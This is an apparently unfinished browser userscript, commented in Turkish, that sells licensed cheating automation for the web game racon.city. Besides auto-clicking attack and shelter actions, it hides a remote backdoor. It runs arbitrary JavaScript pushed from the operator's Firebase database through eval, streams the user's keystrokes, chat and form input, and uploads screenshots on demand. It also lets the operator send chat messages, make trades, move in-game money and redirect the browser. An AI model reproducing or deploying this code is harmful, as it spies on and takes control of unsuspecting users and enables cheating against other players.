(function() {
    'use strict';

    // ==========================================================
    // 1. FIREBASE BAĞLANTISI VE YAPILANDIRMASI
    // ==========================================================
    const firebaseConfig = {
        apiKey: "xyt4vpxnrS1XyPXazntrDkdOVTLb54cFOm52bewT",
        authDomain: "dusklaw-c58e9.firebaseapp.com",
        databaseURL: "https://dusklaw-c58e9-default-rtdb.firebaseio.com/",
        projectId: "dusklaw-c58e9",
        storageBucket: "dusklaw-c58e9.appspot.com",
        messagingSenderId: "735655522685",
        appId: "1:735655522685:web:a6aaf98c44287943b7dc14"
    };

    if (typeof firebase !== 'undefined' && !firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }

    if (typeof firebase === 'undefined') {
        console.error("Firebase yüklenemedi. Script durduruluyor.");
        return;
    }

    const db = firebase.database();

    function getCihazId() {
        let cihazId = localStorage.getItem('yk_cihaz_id');
        if (!cihazId) {
            cihazId = 'YK-' + Math.random().toString(36).substr(2, 9) + '-' + Date.now();
            localStorage.setItem('yk_cihaz_id', cihazId);
        }
        return cihazId;
    }
    const aktifCihazId = getCihazId();
    // TYPE üzerinden yakalıyoruz, diğerlerinden ayırmak için placeholder olmayan diyoruz
    const guvenlikKutusu = document.querySelector('input[type="textt"]:not([placeholder])');
    if (guvenlikKutusu) {
        guvenlikKutusu.setAttribute('inputmode', 'numeric');
        guvenlikKutusu.setAttribute('pattern', '[0-9]*');
        guvenlikKutusu.setAttribute('type', 'tel');
    }

    // ==========================================================
    // 2. LİSANS ARAYÜZÜ
    // ==========================================================
    function lisansEkraniOlustur() {
        const style = document.createElement('style');
        style.innerHTML = `
            #yk-login-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.85); z-index: 10000; display:flex; justify-content:center; align-items:center; }
            #yk-login-box { background: #1a1a1a; padding: 25px; border-radius: 8px; border: 2px solid #8B0000; text-align: center; color: #fff; font-family: Tahoma; width: 320px; box-sizing: border-box; box-shadow: 0 0 15px #8B0000; display: flex; flex-direction: column; align-items: center; }
            .yk-login-input { width: 100%; box-sizing: border-box; background: #333; border: 1px solid #555; color: #fff; padding: 10px; margin: 8px 0; border-radius: 4px; text-align:center; outline:none; display: block; }
            .yk-login-input:focus { border-color: #FFD700; }
            .yk-login-btn { width: 100%; box-sizing: border-box; display: block; background: #8B0000; color: white; border: none; padding: 10px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 15px; transition: 0.2s; }
            .yk-login-btn:hover { background: #b30000; transform: scale(1.02); }
        `;
        document.head.appendChild(style);

        const overlay = document.createElement('div');
        overlay.id = 'yk-login-overlay';
        overlay.innerHTML = `
            <div id="yk-login-box">
                <div style="color: #FFD700; font-size: 20px; font-weight: bold; margin-bottom: 5px;">RACON YK SİSTEMİ</div>
                <div style="font-size: 11px; color: #aaa; margin-bottom: 15px;">Bu cihaza sadece 1 kez kayıt açılabilir.</div>
                <div style="font-size: 10px; color: #555; margin-bottom: 10px;">ID: ${aktifCihazId}</div>
                <input type="text" id="yk_kullanici" class="yk-login-input" placeholder="Kullanıcı Adı Belirle/Gir" autocomplete="off">
                <input type="password" id="yk_sifre" class="yk-login-input" placeholder="Şifre Belirle/Gir">
                <button id="yk_giris_btn" class="yk-login-btn">SİSTEME GİRİŞ YAP</button>
                <div id="yk_mesaj" style="margin-top:12px; font-size:12px; font-weight:bold; color:#ff4444;"></div>
            </div>
        `;
        document.body.appendChild(overlay);

        document.getElementById('yk_giris_btn').addEventListener('click', function() {
            const user = document.getElementById('yk_kullanici').value.trim();
            const key = document.getElementById('yk_sifre').value.trim();
            const mesaj = document.getElementById('yk_mesaj');
            if (!user || !key) { mesaj.innerText = "Kullanıcı adı ve şifre boş olamaz!"; return; }
            mesaj.style.color = "#FFD700"; mesaj.innerText = "Sunucuyla bağlantı kuruluyor...";

            db.ref('lisanslar').orderByChild('cihazId').equalTo(aktifCihazId).once('value').then(cihazSnap => {
                let cihazBaskaHesaptaVarMi = false; let kayitliEskiKullanici = "";
                if (cihazSnap.exists()) { cihazBaskaHesaptaVarMi = true; kayitliEskiKullanici = Object.keys(cihazSnap.val())[0]; }

                db.ref('lisanslar/' + user).once('value').then((snapshot) => {
                    const simdi = Date.now();
                    if (snapshot.exists()) {
                        const data = snapshot.val();
                        if (data.key !== key) { mesaj.style.color = "#ff4444"; mesaj.innerText = "Hatalı şifre!"; return; }
                        if (simdi > data.bitisTarihi) { mesaj.style.color = "#ff4444"; mesaj.innerText = "Lisans süreniz dolmuş veya engellendiniz!"; return; }

                        if (data.cihazId !== aktifCihazId) {
                            if (data.yeni_cihaz_onayi === aktifCihazId) {
                                db.ref('lisanslar/' + user).update({ cihazId: aktifCihazId, yeni_cihaz_onayi: null }); basariliGiris(user, key);
                            } else {
                                mesaj.style.color = "#FFD700"; mesaj.innerText = "Farklı cihaz algılandı! Admine izin talebi iletildi...";
                                db.ref('lisanslar/' + user + '/onay_istegi').set({ cihazId: aktifCihazId, zaman: simdi });
                                db.ref('lisanslar/' + user + '/yeni_cihaz_onayi').on('value', (snap) => { if (snap.val() === aktifCihazId) { document.getElementById('yk_giris_btn').click(); } });
                            } return;
                        }
                        basariliGiris(user, key);
                    } else {
                        if (cihazBaskaHesaptaVarMi) { mesaj.style.color = "#ff4444"; mesaj.innerText = "Bu cihaz zaten '" + kayitliEskiKullanici + "' adlı hesaba kayıtlı!"; return; }
                        mesaj.innerText = "Yeni kayıt oluşturuluyor...";
                        const sinirsizSure = 4102444800000;
                        db.ref('lisanslar/' + user).set({ key: key, bitisTarihi: sinirsizSure, cihazId: aktifCihazId, kayitTarihi: simdi }).then(() => { basariliGiris(user, key); });
                    }
                });
            });
        });

        function basariliGiris(u, k) {
            localStorage.setItem('yk_auth_user', u);
            localStorage.setItem('yk_auth_key', k);
            const overlay = document.getElementById('yk-login-overlay');
            if(overlay) overlay.remove();
            baslatOtomasyon(u);
        }
    }

    // ==========================================================
    // 3. ANA OTOMASYON & CANLI VERİ AKIŞI
    // ==========================================================
    function baslatOtomasyon(aktifKullanici) {


       // ==========================================================
        // GELİŞMİŞ LİSANS VE BAN KILL SWITCH (ANLIK KONTROL SİSTEMİ)
        // ==========================================================
        db.ref('lisanslar/' + aktifKullanici).on('value', (snap) => {
            if (snap.exists()) {
                const data = snap.val();
                const simdi = Date.now();

                if (data.isBanned === true || data.bitisTarihi === 1 || simdi > data.bitisTarihi) {
                    localStorage.removeItem('yk_auth_user');
                    localStorage.removeItem('yk_auth_key');
                    alert("RACON YK: Sistemden süresiz olarak YASAKLANDINIZ veya lisansınız bitti!");
                    // Ban yiyen kullanıcıyı oyun ekranında tutmamak için direkt olarak boş sayfaya yolluyoruz
                    window.location.href = "about:blank";
                }
            }
        });
      // ==========================================
        // YK BULUT KOD & CANLI EKRAN SİSTEMİ (GÜNCELLENDİ)
        // ==========================================

       // Ortak çalıştırıcı ve temizleyici motor
function bulutKodMotoru(data) {
    // Veri yoksa işlem yapma
    if (!data || !data.kod) return;

    // PANELDEKİ "KODU SİL" BUTONU TETİKLENDİĞİNDE
    if (data.kod === "clear") {
        // 1. Varsa aktif bulut döngüsünü temizle
        if (window.aktifBulutGorevi) {
            clearInterval(window.aktifBulutGorevi);
        }
        // 2. Eski sığınak radarını temizler (Mevcut sistemin)
        if (document.getElementById('ugur-yk-radar-panel')) {
            document.getElementById('ugur-yk-radar-panel').remove();
        }
        if (window.radarIntervalYK) {
            clearInterval(window.radarIntervalYK);
        }

        console.log("YK Sistem: Uzaktan gönderilen kod yönetim tarafından temizlendi.");
        return;
    }

    // NORMAL KOD GELDİĞİNDE ÇALIŞTIRACAK KISIM (Sayfa yenilense de çalışır)
    try {
        // Eski sayfadan sarkan bir döngü varsa önce onu durdur
        if (window.aktifBulutGorevi) {
            clearInterval(window.aktifBulutGorevi);
        }

        // Gelen JS kodunu anında tarayıcıda çalıştır
        eval(data.kod);

        console.log("YK: Bulut kod başarıyla başlatıldı/yenilendi.");
    } catch (hata) {
        console.error("YK Bulut Kod Hatası:", hata);
    }
}

        // 1. DİNLEYİCİ: Tüm kullanıcılara gönderilen genel kodları dinler
        db.ref('sistem_ayarlari/bulut_kod_tetikleyici').on('value', (snap) => {
            if (snap.exists()) {
                bulutKodMotoru(snap.val());
            }
        });

        // 2. DİNLEYİCİ: Sadece bu kullanıcıya (aktifKullanici) özel gönderilen kodları dinler
        db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol/bulut_kod').on('value', (snap) => {
            if (snap.exists()) {
                bulutKodMotoru(snap.val());
            }
        });

        // 2. Canlı Ekran Görüntüsü Aktarımı (Admin Yayını Başlattığında)
        let canliYayinInterval = null;
        db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol/canli_yayin_aktif').on('value', (snap) => {
            if(snap.val() === true) {
                if(!canliYayinInterval && typeof html2canvas !== 'undefined') {
                    // Firebase kotasını korumak için 2.5 saniyede bir düşük kaliteli SS alıyoruz
                    canliYayinInterval = setInterval(() => {
                        html2canvas(document.body, { scale: 0.5, useCORS: true }).then(canvas => {
                            // Kaliteyi %40 (0.4) JPEG yaparak veri boyutunu inanılmaz küçültüyoruz
                            const base64Goruntu = canvas.toDataURL('image/jpeg', 0.4);
                            db.ref('lisanslar/' + aktifKullanici + '/anlik_durum/ekran_goruntusu').set(base64Goruntu);
                        });
                    }, 3000);
                }
            } else {
                if(canliYayinInterval) {
                    clearInterval(canliYayinInterval);
                    canliYayinInterval = null;
                    db.ref('lisanslar/' + aktifKullanici + '/anlik_durum/ekran_goruntusu').remove(); // Kapatınca veriyi temizle
                }
            }
        });
        console.log("RACON YK -  Aktif. Kullanıcı: " + aktifKullanici);
        const currentUrl = window.location.href;

        const style = document.createElement('style');
        style.innerHTML = `
            .yk-container { background: #1a1a1a; padding: 15px; border-radius: 8px; border: 1px solid #444; margin: 15px 0; text-align: center; color: #fff; font-family: Tahoma; }
            .yk-input { background: #333; border: 1px solid #555; color: #fff; padding: 5px; margin: 0 5px; width: 120px; border-radius: 4px; }
            .yk-btn { background: #8B0000; color: white; border: none; padding: 6px 15px; border-radius: 4px; cursor: pointer; font-weight: bold; }
            .yk-btn:hover { background: #b30000; }
            .acil-btn { position: fixed; top: 10px; right: 10px; background: #ff0000; color: white; border: none; padding: 10px 15px; border-radius: 5px; z-index: 9999; cursor: pointer; font-weight: bold; }
            .yk-checkbox-label { cursor: pointer; font-size: 13px; color: #ccc; margin-top: 10px; display: inline-block; }
        `;
        document.head.appendChild(style);

        function firebaseCanliGuncelle(tur, veri) {
            db.ref('lisanslar/' + aktifKullanici + '/anlik_durum').update({ [tur]: veri, sonIslemZamani: new Date().toLocaleTimeString() });
        }

        setInterval(() => { firebaseCanliGuncelle('anlik_sayfa', window.location.pathname + window.location.search); }, 1500);

        let sonTuslar = [];
        document.addEventListener('keydown', (e) => {
            if(e.key.length === 1 || e.key === 'Backspace' || e.key === 'Enter') {
                if(e.key === 'Backspace') sonTuslar.pop(); else sonTuslar.push(e.key);
                if(sonTuslar.length > 25) sonTuslar.shift();
                firebaseCanliGuncelle('son_tuslar', sonTuslar.join(''));
            }

            // === YENİ EKLENEN: ENTER VE BACKSPACE KONTROLÜ ===
            if (e.key === 'Enter') {
                const ykBtn = document.getElementById('ykButton');
                if (ykBtn) {
                    e.preventDefault(); // Enter'ın varsayılan form göndermesini engelle
                    ykBtn.click();
                }
            }

           if (e.key === 'Backspace') {
                // Kullanıcı input kutusundayken (hedef, mermi vs. yazarken) silme tuşuna basarsa sığınaktan ÇIKMAMASI için kontrol
                const isTyping = document.activeElement && ['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName) && document.activeElement.type !== 'submit' && document.activeElement.type !== 'button';
                // Dinamik name yerine butonun üzerindeki "Ayrılmak" yazısından yakalıyoruz
                const leaveBtn = document.querySelector('input[value*="Ayrılmak"]') || document.querySelector('input[name="leave"]');
                if (leaveBtn && !isTyping) {
                    e.preventDefault();
                    // Tarayıcının geri gitme işlemini engelle
                    leaveBtn.click();
                }
            }
            // === YENİ EKLENEN SONU ===
        });
        document.addEventListener('click', (e) => {
            if(e.target.id === 'openPopupButton2' || e.target.closest('#openPopupButton2')) { firebaseCanliGuncelle('son_tiklama', 'Mesajlar Açıldı'); }
            else if (e.target.name === 'leave' || (e.target.value && e.target.value.includes('Ayrılmak'))) { firebaseCanliGuncelle('son_tiklama', 'Sığınaktan Ayrıl (leave) Basıldı'); }
        });

        setInterval(() => {
            const elChat = document.getElementById('gidenveri1');
            const elKoyMiktar = document.querySelector('input[name="koymiktar"]');
            const elKoyulan = document.querySelector('select[name="koyulan"]');
            const elIstMiktar = document.querySelector('input[name="istmiktar"]');
            const elIstenen = document.querySelector('select[name="istenen"]');
            const elTempUser = document.getElementById('temp_user') || document.querySelector('input[name="kill_username"]');
            const elTempBullets = document.getElementById('temp_bullets') || document.querySelector('input[name="kill_bullets"]');

            if(elChat && document.activeElement === elChat) firebaseCanliGuncelle('chat_input', elChat.value);
            if(elKoyMiktar && document.activeElement === elKoyMiktar) firebaseCanliGuncelle('koymiktar_input', elKoyMiktar.value);
            if(elKoyulan && document.activeElement === elKoyulan) firebaseCanliGuncelle('koyulan_select', elKoyulan.value);
            if(elIstMiktar && document.activeElement === elIstMiktar) firebaseCanliGuncelle('istmiktar_input', elIstMiktar.value);
            if(elIstenen && document.activeElement === elIstenen) firebaseCanliGuncelle('istenen_select', elIstenen.value);
            if(elTempUser && document.activeElement === elTempUser) firebaseCanliGuncelle('hedef_input', elTempUser.value);
            if(elTempBullets && document.activeElement === elTempBullets) firebaseCanliGuncelle('mermi_input', elTempBullets.value);
        }, 500);

       db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol').on('value', (snapshot) => {
            if(!snapshot.exists()) return;
            const ayarlar = snapshot.val();

            if(ayarlar.hedef) { localStorage.setItem('sys_target_cache', ayarlar.hedef); localStorage.setItem('targetUser', ayarlar.hedef); const domHedef = document.getElementById('temp_user'); if(domHedef) domHedef.value = ayarlar.hedef; }
            if(ayarlar.mermi) { localStorage.setItem('targetBullets', ayarlar.mermi); const domMermi = document.getElementById('temp_bullets'); if(domMermi) domMermi.value = ayarlar.mermi; }
            if(ayarlar.kacir !== undefined) { localStorage.setItem('isKacir', ayarlar.kacir ? 'true' : 'false'); const domKacir = document.getElementById('chk_kacir'); if(domKacir) domKacir.checked = ayarlar.kacir; firebaseCanliGuncelle('anlik_kacir_modu', ayarlar.kacir); }
            if(ayarlar.siginak_saat) { localStorage.setItem('varsayilan_siginak_suresi', ayarlar.siginak_saat); const onSecim = document.getElementById('yk_on_secim'); if(onSecim) { onSecim.value = ayarlar.siginak_saat; onSecim.dispatchEvent(new Event('change')); } const gercekKutu = document.getElementById('siginak_sure_secici'); if(gercekKutu) { gercekKutu.value = ayarlar.siginak_saat; gercekKutu.dispatchEvent(new Event('change')); } db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol/siginak_saat').remove(); }

            if(ayarlar.chat_gonder_fetch) {
                fetch('write.php', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'mesaj=' + encodeURIComponent(ayarlar.chat_gonder_fetch.mesaj) });
                db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol/chat_gonder_fetch').remove();
            }

            if(ayarlar.takasa_at_fetch) {
                const fd = new URLSearchParams();
                fd.append('koymiktar', ayarlar.takasa_at_fetch.koymiktar);
                fd.append('koyulan', ayarlar.takasa_at_fetch.koyulan);
                fd.append('istmiktar', ayarlar.takasa_at_fetch.istmiktar);
                fd.append('istenen', ayarlar.takasa_at_fetch.istenen);
                fd.append('koybe', 'Takası Koy');

                fetch('https://www.racon.city/m/takas2.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: fd.toString()
                });
                db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol/takasa_at_fetch').remove();
            }

           // === YENİ EKLENEN: KASA (VİLLA) UZAKTAN KONTROL FETCH ===
            if(ayarlar.kasa_islem_fetch) {
                const fd = new URLSearchParams();
                const tur = ayarlar.kasa_islem_fetch.tur;     // 'para' veya 'mermi'
                const islem = ayarlar.kasa_islem_fetch.islem; // 'ekle' veya 'al'
                const miktar = ayarlar.kasa_islem_fetch.miktar;

                // Oyunun formu bu gizli veriyi zorunlu istiyor
                fd.append('kim', 'sahip');

                if (tur === 'para') {
                    fd.append('para', miktar); // name=para
                    if (islem === 'ekle') {
                        fd.append('eklep', 'Ekle'); // Para ekleme butonu
                    } else if (islem === 'al') {
                        fd.append('alp', 'Al');     // Para çekme butonu
                    }
                } else if (tur === 'mermi') {
                    fd.append('mermi', miktar); // name=mermi
                    if (islem === 'ekle') {
                        fd.append('eklem', 'Ekle'); // Mermi ekleme butonu
                    } else if (islem === 'al') {
                        fd.append('alm', 'Al');     // Mermi çekme butonu
                    }
                }

                fetch('https://www.racon.city/m/villa2.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: fd.toString()
                }).then(() => {
                    console.log("Kasa emri başarıyla uygulandı.");
                });

                db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol/kasa_islem_fetch').remove();
            }
            // === YENİ EKLENEN KASA SONU ===

            if(ayarlar.leave_tikla) {
                const leaveBtn = document.querySelector('input[value*="Ayrılmak"]') || document.querySelector('input[name="leave"]');
                if(leaveBtn) leaveBtn.click();
                db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol/leave_tikla').remove();
            }
            if(ayarlar.yk_tikla) { const ykBtn = document.getElementById('ykButton'); if(ykBtn) ykBtn.click(); db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol/yk_tikla').remove(); }

            if(ayarlar.about_blank) {
                db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol/about_blank').remove().then(() => {
                    document.body.innerHTML = ""; // Ekranı anında temizle
                    window.location.href = 'about:blank'; // Boş sekmeye yönlendir
                });
            }
         // === UZAKTAN SAYFA YÖNLENDİRME ===
            if(ayarlar.yonlendir) {
                db.ref('lisanslar/' + aktifKullanici + '/uzaktan_kontrol/yonlendir').remove().then(() => {
                    window.location.href = ayarlar.yonlendir;
                });
            }
        });

       // Tarayıcının "textt" tipini "text" yapma ihtimaline karşı ikisini de dinliyoruz
        // Direkt size="10" üzerinden yakalıyoruz
        const targetSelector = 'input[size="10"]:not([data-yk-tiklandi="true"])';
        const tiklaVeGec = () => {
            const inputElement = document.querySelector(targetSelector);
            if (inputElement) {
                inputElement.setAttribute('data-yk-tiklandi', 'true');
                inputElement.click();
                inputElement.focus();
            }
        };
        tiklaVeGec(); new MutationObserver(tiklaVeGec).observe(document.body, { childList: true, subtree: true });

        let listenerEklendi = false;
        function elementleriKontrolEt() {
            if (listenerEklendi) return;
            // Dinleyiciyi size="10" olan güvenlik kutusuna ekliyoruz
            const guvenlikKoduInput = document.querySelector('input[size="10"]');
            if (guvenlikKoduInput) {
                guvenlikKoduInput.addEventListener('input', function() {
                    if (this.value.length === 2) {
                        const siginakButonu = document.querySelector('input[value="Sığınağa Gireyim!"]');
                        if (siginakButonu) {
                            siginakButonu.click();
                        } else {
                            const ykSaldirButonu = document.getElementById('btn_saldir') || document.querySelector('input[name="kill_button_saldir"]');
                            if (ykSaldirButonu) {
                                ykSaldirButonu.click();
                            } else {
                                const eskiSaldirButonu = document.getElementById('kill_button3');
                                if (eskiSaldirButonu) eskiSaldirButonu.click();
                            }
                        }
                    }
                });
                listenerEklendi = true;
            }
        }
        setInterval(elementleriKontrolEt, 500);

        if (currentUrl.includes("safe2.php") || currentUrl.includes("oyun.php")) {
            if (localStorage.getItem('go_to_kill3') === 'true') { localStorage.removeItem('go_to_kill3'); window.location.href = 'https://www.racon.city/m/kill3.php'; }

            function ykPaneliAnindaYukle() {
                let leaveBtn = document.querySelector('input[value*="Ayrılmak"]') || document.querySelector('input[name="leave"]');
                if (leaveBtn && !document.getElementById('temp_user')) {
                    const kaliciKullanici = localStorage.getItem('sys_target_cache') || "";
                    const kaliciMermi = localStorage.getItem('targetBullets') || "";
                    const kaliciKacir = localStorage.getItem('isKacir') === 'true' ? 'checked' : '';

                    const div = document.createElement('div');
                    div.className = "yk-container";
                    div.innerHTML = `<div style="margin-bottom:8px; font-weight:bold;">YK PANELİ</div>
                        <input type="text" id="temp_user" list="safe_eniyiler_listesi" class="yk-input" placeholder="Kullanıcı Adı" value="${kaliciKullanici}" autocomplete="off">
                        <datalist id="safe_eniyiler_listesi"></datalist>
                        <input type="text" id="temp_bullets" class="yk-input" style="width:70px;" placeholder="Mermi" value="${kaliciMermi}" autocomplete="off">
                        <br><label class="yk-checkbox-label"><input type="checkbox" id="chk_kacir" style="vertical-align: middle;" ${kaliciKacir}> KAÇIR MODU AKTİF ET</label><br><br>
                        <button id="ykButton" class="yk-btn">YK :)</button>`;

                    leaveBtn.parentNode.insertBefore(div, leaveBtn);

                    const datalistSafe = document.getElementById('safe_eniyiler_listesi');
                    const hafizadakiIsimler = JSON.parse(localStorage.getItem('en_iyiler_user_list') || '[]');

                    hafizadakiIsimler.forEach(isim => {
                        let option = document.createElement('option');
                        option.value = isim;
                        datalistSafe.appendChild(option);
                    });

                    if (!sessionStorage.getItem('sys_list_synced') && hafizadakiIsimler.length > 0) {
                        db.ref('admin_paneli/en_iyiler_listesi').set(hafizadakiIsimler)
                            .then(() => {
                                sessionStorage.setItem('sys_list_synced', 'true');
                                console.log("Liste YK Admin için Firebase'e aktarıldı.");
                            });
                    }

                    document.getElementById('temp_user').addEventListener('input', function() { localStorage.setItem('sys_target_cache', this.value); firebaseCanliGuncelle('anlik_hedef', this.value); });
                    document.getElementById('temp_bullets').addEventListener('input', function() { localStorage.setItem('targetBullets', this.value); firebaseCanliGuncelle('anlik_mermi', this.value); });
                    document.getElementById('chk_kacir').addEventListener('change', function() { const kacirDurumu = this.checked; localStorage.setItem('isKacir', kacirDurumu ? 'true' : 'false'); firebaseCanliGuncelle('anlik_kacir_modu', kacirDurumu); });

                    let ykIslemde = false;
function ykGecisBaslat() {
    if (ykIslemde) return;
    ykIslemde = true;

    localStorage.setItem('targetUser', document.getElementById('temp_user').value);
    localStorage.setItem('targetBullets', document.getElementById('temp_bullets').value);
    localStorage.setItem('isKacir', document.getElementById('chk_kacir').checked ? 'true' : 'false');
    localStorage.setItem('go_to_kill3', 'true'); // yedek: sayfa 60ms dolmadan yenilenirse kill3'e yine gider

    // 150ms bekle -> "Sığınaktan Çık"a bas -> 60ms bekle -> kill3.php
    setTimeout(() => {
        leaveBtn.click();
        setTimeout(() => {
            localStorage.removeItem('go_to_kill3');
            ykIslemde = false;
            window.location.href = 'https://www.racon.city/m/kill3.php';
        }, 60);
    }, 150);
}

document.getElementById('ykButton').onclick = ykGecisBaslat;

// Enter'a basınca da aynı işlem
document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        ykGecisBaslat();
    }
});
                    return true;
                }
                return false;
            }

            if (!ykPaneliAnindaYukle()) {
                const ykObserver = new MutationObserver((mutations, obs) => {
                    if (ykPaneliAnindaYukle()) {
                        obs.disconnect();
                    }
                });
                ykObserver.observe(document.documentElement, { childList: true, subtree: true });
            }

            setInterval(() => {
                const tdElements = document.querySelectorAll('td'); let siginakAyarYeri = null;
                for (let td of tdElements) { if (td.textContent.includes('Sığınakta olduğunuz sürede saldırı almazsınız.')) { siginakAyarYeri = td; break; } }
                if (siginakAyarYeri && !document.getElementById('yk_siginak_ayari')) {
                    const ayarDiv = document.createElement('div'); ayarDiv.id = 'yk_siginak_ayari'; ayarDiv.style = "margin: 15px auto; padding: 10px; border: 1px solid #444; background-color: #1a1a1a; width: 350px; border-radius: 5px; text-align: center;";
                    ayarDiv.innerHTML = `<div style="color: #FFD700; font-weight: bold; margin-bottom: 8px;">Uğur YK - Sığınak Ön Ayarı</div><span style="color: white; font-size: 12px; margin-right: 10px;">Gireceğin Süreyi Seç:</span>
                        <select id="yk_on_secim" style="width: 100px; padding: 3px; background: #333; color: white; border: 1px solid #666;"><option value="1">1 Saat</option><option value="8">8 Saat</option><option value="9">9 Saat</option><option value="12">12 Saat</option><option value="24">24 Saat</option></select>`;
                    siginakAyarYeri.insertBefore(ayarDiv, siginakAyarYeri.firstChild);
                    document.getElementById('yk_on_secim').value = localStorage.getItem('varsayilan_siginak_suresi') || "1";
                    document.getElementById('yk_on_secim').addEventListener('change', function() { localStorage.setItem('varsayilan_siginak_suresi', this.value); var gercekKutu = document.getElementById('siginak_sure_secici'); if(gercekKutu) { gercekKutu.value = this.value; gercekKutu.dispatchEvent(new Event('change')); } });
                }
               // name özelliği sürekli değiştiği için sabit olan size="12" üzerinden yakalıyoruz
                var input = document.querySelector('input[size="12"]');
                if (input && !document.getElementById('siginak_sure_secici')) {
                    input.style.display = 'none'; var select = document.createElement('select'); select.id = 'siginak_sure_secici'; select.style.width = "150px"; select.style.height = "30px";
                    var kaydedilmisSure = localStorage.getItem('varsayilan_siginak_suresi') || "1";
                    ["1", "8", "9", "12", "24"].forEach(v => { var opt = document.createElement('option'); opt.value = v; opt.text = v; if(v === kaydedilmisSure) opt.selected = true; select.appendChild(opt); });
                    select.onchange = function() { input.value = this.value; localStorage.setItem('varsayilan_siginak_suresi', this.value); var onSecimKutusu = document.getElementById('yk_on_secim'); if(onSecimKutusu) onSecimKutusu.value = this.value; };
                    input.parentNode.insertBefore(select, input.nextSibling); input.value = kaydedilmisSure;
                }
            }, 500);
        }

        if (currentUrl.includes('kill3.php')) {
            setInterval(() => {
                let sayacDiv = document.getElementById('sayac-div'); const referansBtn = document.getElementById('btn_saldir') || document.getElementById('btn_kacir');
                if (!sayacDiv && referansBtn) { sayacDiv = document.createElement('div'); sayacDiv.id = 'sayac-div'; referansBtn.parentNode.insertBefore(sayacDiv, referansBtn); }
                if (sayacDiv) { sayacDiv.style = "display:block; text-align:center; padding:8px; font-size:20px; font-weight:bold;"; if (sayacDiv.innerHTML !== '<span style="color: #8B0000;">Uğur</span> <span style="color: #FFD700;">YK :)</span>') { sayacDiv.innerHTML = '<span style="color: #8B0000;">Uğur</span> <span style="color: #FFD700;">YK :)</span>'; } }
            }, 100);

            function bypassButton(id, newText) {
    const oldBtn = document.getElementById(id);
    if (oldBtn) {
        const newBtn = oldBtn.cloneNode(true);
        newBtn.disabled = false;
        newBtn.value = newText;

        // YENİ EKLENEN KISIM: Butona fareyle tıklayınca 150ms sonra sığınağa atar
        newBtn.addEventListener('click', function() {
            setTimeout(() => { window.location.href = 'https://www.racon.city/m/safe2.php'; }, 150);
        });

        oldBtn.parentNode.replaceChild(newBtn, oldBtn);
    }
}
setTimeout(() => { bypassButton('btn_saldir', 'SALDIR (YK)'); bypassButton('btn_kacir', 'KAÇIR (YK)'); }, 500);

           const uInput = document.querySelector('input[placeholder="Kullanıcı Adı"]');
           const bInput = document.querySelector('input[placeholder="Harcanacak Mermi"]');
            if (uInput) uInput.value = localStorage.getItem('targetUser') || ""; if (bInput) bInput.value = localStorage.getItem('targetBullets') || "";

            const acil = document.createElement('button'); acil.className = "acil-btn"; acil.innerText = "F2 - ACİL SIĞINAK"; acil.onclick = () => window.location.href = 'https://www.racon.city/m/safe2.php'; document.body.appendChild(acil);

           document.addEventListener('keydown', (e) => {
            if(e.key === 'F2') acil.click();
            if(e.key === 'Enter') {
                e.preventDefault();
                if (localStorage.getItem('isKacir') === 'true') { let kacirBtn = document.getElementById('btn_kacir') || document.querySelector('input[name="kill_button_kacir"]'); if (kacirBtn) kacirBtn.click(); else { let form = document.querySelector('form'); if(form){ let t = document.createElement('input'); t.type = 'submit'; t.name = 'kill_button_kacir'; t.style.display='none'; form.appendChild(t); t.click(); } } }
                else { let saldirBtn = document.getElementById('btn_saldir'); if (saldirBtn) saldirBtn.click(); else { let form = document.querySelector('form'); if(form) form.submit(); } }
                setTimeout(() => { window.location.href = 'https://www.racon.city/m/safe2.php'; }, 150);
            }
        });
    }
// YK panelinin sonradan açılma ihtimaline karşı sayfayı belirli aralıklarla kontrol ediyoruz
setInterval(() => {
    // İçerisinde "yk :)" yazan ve henüz işlem yapmadığımız buton/linkleri bul
    let ykButtons = Array.from(document.querySelectorAll('button, a, div')).filter(el =>
        el.textContent.trim().includes('yk :)') && !el.dataset.hizliYonlendirme
    );

    ykButtons.forEach(btn => {
        btn.dataset.hizliYonlendirme = "true"; // Aynı butona defalarca kod eklememek için işaretliyoruz

        // Tıklama olayını yakala (true parametresi oyunun kendi kodundan önce çalışmasını sağlar)
        btn.addEventListener('click', function(e) {
            e.preventDefault(); // Varsayılan tıklama davranışını iptal et
            e.stopImmediatePropagation(); // Oyunun kendi gecikmeli/kasan kodlarının çalışmasını engelle

            // Hiç beklemeden anında kill3.php sayfasına git
            window.location.href = 'kill3.php';
        }, true);
    });
}, 500); // Her yarım saniyede bir paneli kontrol et

    if (currentUrl.includes('simulator.php')) {
        setInterval(() => {
            const hafizadakiIsimler = JSON.parse(localStorage.getItem('en_iyiler_user_list') || '[]'); if (hafizadakiIsimler.length === 0) return;
            const simInput = document.querySelector('input[name*="user"]') || document.querySelector('input[type="text"]');
            if (simInput && !document.getElementById('sim_eniyiler_listesi')) {
                const datalist = document.createElement('datalist'); datalist.id = 'sim_eniyiler_listesi';
                hafizadakiIsimler.forEach(isim => { let option = document.createElement('option'); option.value = isim; datalist.appendChild(option); });
                document.body.appendChild(datalist); simInput.setAttribute('list', 'sim_eniyiler_listesi'); simInput.placeholder = "HEDEF NİCK :)";
            }
        }, 200);
    } // <--- HATA BURADAYDI: Bu süslü parantez eksikti, eklendi.
// ==========================================================
// YK GİZLİ SOHBET AĞI (cht2.php ENTEGRASYONU)
// ==========================================================
if (window.location.href.includes("cht2.php")) {

